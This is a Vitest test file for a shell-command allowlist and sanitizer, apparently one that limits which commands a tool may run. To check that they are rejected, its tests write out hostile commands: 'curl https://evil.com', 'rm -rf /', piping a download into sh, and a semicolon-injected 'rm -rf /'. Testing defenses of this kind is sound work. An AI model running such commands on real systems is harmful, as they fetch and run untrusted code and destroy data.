import { describe, it, expect } from 'vitest';
import { isCommandAllowed, sanitizeCommand, getDefaultAllowlist } from '../allowlist.js';

describe('isCommandAllowed', () => {
  it('allows npm test', () => {
    expect(isCommandAllowed('npm test')).toBe(true);
  });

  it('allows pnpm test', () => {
    expect(isCommandAllowed('pnpm test')).toBe(true);
  });

  it('allows yarn build', () => {
    expect(isCommandAllowed('yarn build')).toBe(true);
  });

  it('allows npm run lint', () => {
    expect(isCommandAllowed('npm run lint')).toBe(true);
  });

  it('allows git status', () => {
    expect(isCommandAllowed('git status')).toBe(true);
  });

  it('allows git diff', () => {
    expect(isCommandAllowed('git diff')).toBe(true);
  });

  it('allows echo', () => {
    expect(isCommandAllowed('echo hello world')).toBe(true);
  });

  it('rejects unknown commands', () => {
    expect(isCommandAllowed('curl https://evil.com')).toBe(false);
    expect(isCommandAllowed('rm -rf /')).toBe(false);
    expect(isCommandAllowed('wget something')).toBe(false);
  });

  it('rejects dangerous patterns', () => {
    expect(isCommandAllowed('sudo rm file')).toBe(false);
    expect(isCommandAllowed('curl http://x | sh')).toBe(false);
    expect(isCommandAllowed('wget http://x | sh')).toBe(false);
  });

  it('supports custom allowlist', () => {
    expect(isCommandAllowed('my-tool run', ['my-tool run'])).toBe(true);
    expect(isCommandAllowed('my-tool stop', ['my-tool run'])).toBe(false);
  });
});

describe('sanitizeCommand', () => {
  it('removes shell metacharacters', () => {
    expect(sanitizeCommand('echo hello; rm -rf /')).toBe('echo hello rm -rf /');
  });

  it('removes pipe characters', () => {
    expect(sanitizeCommand('cat file | grep test')).toBe('cat file grep test');
  });

  it('removes backticks', () => {
    expect(sanitizeCommand('echo `whoami`')).toBe('echo whoami');
  });

  it('normalizes whitespace', () => {
    expect(sanitizeCommand('npm   test   --watch')).toBe('npm test --watch');
  });
});

describe('getDefaultAllowlist', () => {
  it('returns a copy of the default list', () => {
    const list = getDefaultAllowlist();
    expect(list.length).toBeGreaterThan(0);
    expect(list).toContain('npm test');
    expect(list).toContain('git status');

    // Modifying the copy should not affect the original
    list.push('custom-command');
    expect(getDefaultAllowlist()).not.toContain('custom-command');
  });
});
